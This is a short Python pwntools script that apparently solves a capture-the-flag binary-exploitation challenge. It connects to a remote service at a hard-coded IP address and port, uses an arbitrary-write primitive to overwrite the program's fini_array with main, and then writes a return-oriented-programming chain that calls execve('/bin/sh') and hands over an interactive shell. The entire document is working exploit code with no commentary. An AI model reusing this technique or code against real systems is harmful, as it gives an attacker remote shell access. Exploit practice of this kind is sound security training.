from pwn import*
from time import*
#p=process('./stack')
p=remote('101.42.48.14',8092)
#sleep(5)
fh=0x6ca0a8
fini_array=0x6c9ef0
main=0x400a22
pop_rax=0x41f5b4
pop_rdi=0x401686
pop_rdx_rsi=0x442a69
syscall=0x4676d5
binsh=fh+0x40
leave_ret=0x400a67
ret=0x4002e1
def write(add,context):
	p.recvuntil('stack:\n')
	p.send(p64(add))
	p.recvuntil('stack:\n')
	p.send(context)
print(hex(leave_ret))
write(fini_array,p64(main))
write(fh,p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(binsh)+p64(pop_rdx_rsi)+p64(0)+p64(0)+p64(syscall)+'/bin/sh\x00')
p.interactive()
